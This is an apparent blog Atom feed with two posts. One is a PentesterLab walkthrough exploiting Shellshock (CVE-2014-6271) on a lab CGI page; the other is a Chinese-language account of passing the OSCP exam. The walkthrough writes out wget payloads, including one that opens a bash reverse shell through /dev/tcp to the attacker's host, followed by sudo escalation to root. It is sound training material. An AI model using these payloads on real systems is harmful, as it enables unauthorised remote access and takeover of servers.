<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-05-08T00:46:45-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] CVE-2014-6271/Shellshock]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock/"/>
    <updated>2015-05-07T07:33:16-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit CVE-2014-6271 [Shellshock] vulnerability. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/cve-2014-6271'>here</a>. The <a href='https://www.pentesterlab.com/exercises/cve-2014-6271/course'>official course</a> is highly recommanded to read, which explains how the bug works and the ways to exploit it for different purposes.</p>

<p>Difficaulty: 1 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/127037311?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>By checking source code of the web page and found hidden path &#8220;/cgi-bin/status&#8221; [firefox]</li>
<li>Test and Exploit shellshock vulnerability to get reverse shell and ROOT [nc]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://netcat.sourceforge.net/'>nc</a></li>
</ul>




<h2>Walkthrough</h2>


<p>This is a pretty easy one and not much things to talk. In according to we already know the server is vulnerable to ShellShock (CVE-2014-6271), so all we need to do just find the target machine, test if the vulnerability still works and exploit it to get a shell.</p>

<h3>Find and Exploit the ShellShock vulnerability</h3>


<p>After found the IP address of target server, and based on the result of Nmap scan, the attacker discovered apache is running and listening on TCP port 80.</p>

<p><img src="http://f4l13n5n0w.github.io/downloads/shellshock/1.png"></p>

<p>Then the attacker interacted with the web server, by using “Firefox” browser to graphically render the web application on the target. By checking the source code, the attacker found the CGI page which calls system command (“/cgi-bin/status”).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/2.png"></p>

<p>After found the CGI page, the attacker use &ldquo;wget&rdquo; to test if there is ShellShock vulnerability in this CGI page.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/3.png"></p>

<p>As we can see above, the command &ldquo;echo vulnerable&rdquo; has been executed by the server, so it is vulnerable to ShellShock.</p>

<p>Now it is time to exploit it. The attacker set up NC listen on port 5555 and send the following command to exploit for getting a reverse shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -i >& /dev/tcp/10.10.10.131/5555 0>&1" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/4.png"></p>

<p>Due to pentesterlab is belong to sudoers group, so it is easy to get ROOT through &ldquo;sudo&rdquo; command.</p>

<p><img src="http://f4l13n5n0w.github.io/downloads/shellshock/5.png"></p>

<p>Game over :)</p>

<h2>Reference</h2>


<p>For more information about shell shock/bash bug, the following links have already given out good explaination.</p>

<p>[1] <a href="http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability">http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability</a><br>
[2] <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited</a><br>
[3] <a href="https://blog.cloudflare.com/inside-shellshock/">https://blog.cloudflare.com/inside-shellshock/</a><br></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[经验分享] OSCP 渗透测试认证]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng/"/>
    <updated>2015-05-05T06:48:31-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng</id>
    <content type="html"><![CDATA[<p><img class="center" src="http://f4l13n5n0w.github.io/downloads/oscp-certs.png" width="250" height="150">
“120天的旅程即将结束，以一场历时24小时没有选择题的考试，收获屠龙路上第一座里程碑。…” 这是我通过OSCP认证考试时，第一时间的感受。自豪和欣喜之情不亚于2008年我拿下CCIE R&amp;S的时候。
关于 PWK (Pentesting with Kali Linux) 和OSCP (Offensive Security Certified Professional)，我想很多人会觉着陌生。但说起Offensive Security，BackTrack，Kali，NetHunter和Metasploit，圈里的朋友应该就熟悉多了。</p>

<!-- more -->


<p>作为在老外圈子里备受推崇的渗透测试技术类认证，国外从业人员对它的介绍和评价已经足够丰富了：</br>
<a href="http://netsec.ws/?p=398">http://netsec.ws/?p=398</a></br>
<a href="http://www.jasonbernier.com/oscp-review/">http://www.jasonbernier.com/oscp-review/</a></br>
<a href="http://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/">http://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/</a></br>
<a href="http://www.securitysift.com/offsec-pwb-oscp/">http://www.securitysift.com/offsec-pwb-oscp/</a></br>
<a href="http://wp.sgrosshome.com/2014/07/22/offensive-security-certified-professional-my-experience-and-review/">http://wp.sgrosshome.com/2014/07/22/offensive-security-certified-professional-my-experience-and-review/</a></br>
<a href="http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/">http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/</a></br>
<a href="https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/">https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/</a></br>
<a href="http://buffered.io/posts/oscp-and-me/">http://buffered.io/posts/oscp-and-me/</a></br>
<a href="http://www.hackingtheperimeter.com/2014/12/introduction-id-wanted-to-take-on-oscp.html">http://www.hackingtheperimeter.com/2014/12/introduction-id-wanted-to-take-on-oscp.html</a></br></p>

<p>然而，遗憾的发现，并没有关于这个认证的中文介绍。也许是因为语言问题，也许是因为这个认证还在起步阶段没有宣传吧。但是不同于CEH等一系列的纸上谈兵，这是一个真枪实弹的学习经历。不同于现在火热的Web攻击，这个认证更偏重于传统的内网渗透技术。</p>

<h2>关于教材</h2>


<p>300多页的教材涵盖了所有从基础知识到进阶的渗透测试技巧（当然不是深入）。所以对于没有渗透经验的朋友（但还是需要基本计算机和网络的知识，如果有编程基础会更好但不是必须），这是一个很好的入门级课程。关于这个课程的具体内容可以查看<a href='https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf'>这里</a>。</p>

<h2>关于PWK Labs</h2>


<p>相对于其他认证课程来说，OSCP与众不同也是最吸引人的是它设计详实的Online Lab（包括4个子网，57台主机/服务器，每一台主机/服务器都包含Offensive Security团队在真实工作环境中遇到的漏洞）。我的起点是VPN连接到Public Network中的一台主机，终点是渗透进入到Admin Network。 57台设备（除掉网关/防火墙）都是目标，都存在漏洞可以被攻破并获得最高权限。所以获取所有设备的最高权限（ROOT/SYSTEM）并读取证明文件（proof.txt或者network-secret.txt）也就是终极目标。在实现这个终极目标中，你不仅会学习各种exploits利用，弱密码，Web漏洞以及一系列提权技巧和漏洞利用。除了技术层面，更重要的是你能学到耐心和思路。漏洞就在那里，如果没找到只能是因为不够仔细和耐心，”TRY HARDER”是整个课程的标语。每攻破一个主机，都需要在后边自主的学习，查资料，有时还需要灵光一闪的运气。更难得的是，lab里边50多台主机服务器不是独立无关的。有时候你需要攻破特定主机并从中获取相应信息才能帮助你攻破其他的主机。而整个Lab里的高潮恐怕要算是端口转发（port forwarding）和Pivoting（实在不会翻译，类似于利用跳板进入不可路由网络）。</p>

<h2>关于考试</h2>


<p>OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。战利品有local.txt（一般权限可得）和proof.txt（最高权限可得），分别对应不同的分数。满分100分，70分可以通过考试。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p>

<h2>我的经验</h2>


<p>首先，虽然课程本身是没有门槛的，但是购买Lab机时还是不便宜的。对渗透了解的越少你所需要的时间就越多，所以我还是建议先对渗透测试有一定了解之后再选择这个课程，有几个非常好的热身网站推荐给大家：</br>
<a href="http://vulnhub.com/">http://vulnhub.com/</a></br>
<a href="https://www.pentesterlab.com/">https://www.pentesterlab.com/</a></br></p>

<p>下面就是我的120天学习经历</p>

<p>由于不知道水深水浅，一开始买了60天的Lab时间。拿到教材和视频之后，大概用了一周多的时间把教材和视频过完，并完成课后练习题（这个时间取决于你的基础有多少，每天4-6个小时学习的话应该最多不会超过3周）。</p>

<p>终于可以摩拳擦掌进入在线Lab了。我的起点是Public Network里的一台电脑，利用课程里学到的知识对目标网络进行信息收集和枚举（enumeration）。Nmap是用的最多的工具之一。目标主机/服务器有着不同的难度，所以我的策略是先从头开始一个一个过，拿下简单的，如果没思路了就留下，开始下一个。过完一遍之后，再翻过头来做更仔细的枚举（enumeration）和上网查资料，直到发现漏洞。几乎所有的主机都存在“已知”漏洞，所以剩下的工作就是仔细挖掘把它找出来。然而现实并不像想象的那么简单，很多时候的感觉就是“你明明知道漏洞就在那里却找不到”的崩溃。每一台攻破的机器都包含一个proof.txt战利品文件用来证明该主机已经被征服，有时候还会发现network-secrets.txt文件用来在control panel里解开不同的子网（IT, DEV and Admin）。有些主机里还包含攻克其他主机的线索，所以对每台被攻破的主机都需要仔细检查一番，搜集尽可能多的线索。</p>

<p>很快的60天的Lab时间就用完了，我只拿下了30几台主机并解锁了2个子网（IT和DEV）。我显然还没有准备好考试，于是又续了30天的Lab。这30天里剩下的都是一些硬骨头了，更多的的利用Pivoting拿下IT和DEV子网里的主机，并解锁了Admin子网。时间又一次接近尾声，还剩下不到10台主机（其中包括“著名的”pain，sufferance和humble）。我再一次续了30天，我想拿下所有的主机。最终，除了humble和Admin子网里的Jack（获得shell但没能提权）没有拿下，我攻破并提权了其他所有的50多台主机。我想，我应该去考试了。之后花了我大概一周的时间整理出Lab实验报告，一共是369页。</p>

<p>我约的考试是从周五晚上7点开始，时长23小时45分钟。一共五台目标机器跟Lab里的一样包含已知漏洞。总分100分，70分过。</p>

<p>晚上8点27分，拿下第一台主机。
10点，第二台主机。
凌晨1点27分，第三台主机也被攻破。
然后一直到凌晨5点多，再没有建树。困得不行的我，决定小睡三小时，闹铃上到早上8点半起。截止到这时候，我只有50分。
8点半起来继续研究，终于10点52分，拿下第四台主机（我认为是最难的一台）。
这时已经拿到75分，可以过了。中午简单的吃了些午饭，回来继续最后一个主机。</p>

<p>又过了几个小时的网上搜索，修改和测试，终于在下午2点35分的时候攻破最后一台主机。这时我拿到了100分。在反复检查和做好所有截屏工作之后，我决定先去好好的睡一觉。24小时的考试结束后，我还有24小时的时间整理和提交考试报告。
一觉睡到晚上9点多，起来写报告。因为只有五台主机，又有了之前Lab报告的经验，截屏和记录工作做的还不错，报告花了我大概2两个多小时就结束了。之后就是打包上传，然后再去睡个好觉 :)</p>

<p>过了一天，收到了下边的邮件，写下了开头的那句话。</p>

<p><img class="center" src="http://f4l13n5n0w.github.io/downloads/oscp.png">
最后，感谢IRC里的admin们和所有聊过天，帮助过我的朋友：</p>

<ul style="list-style-type:disc">
<li>goodbestguy</li>
<li>haken29a</li>
<li>loneferret</li>
<li>bolexxx</li>
<li>g0tmi1k_</li>
<li>stormtide31</li>
<li>Zipkoppie</li>
<li>B34</li>
</ul>


<p>最最后，发几个对Lab和考试有帮助的总结帖子（cheat sheets）:</p>

<p><ul style="list-style-type:disc">
<li><a href='http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse shell cheat sheet</a></li>
<li><a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'>Basic Linux Privilege Escalation</a></li>
<li><a href='http://netsec.ws/?p=331'>Creating Metasploit Payloads</a></li>
<li><a href='https://sathisharthars.wordpress.com/2015/01/28/oscp-offensive-security-certified-professional-handy-tips-and-tricks/'>OSCP Handy Tips and Tricks</a></li></p>
]]></content>
  </entry>
  
</feed>
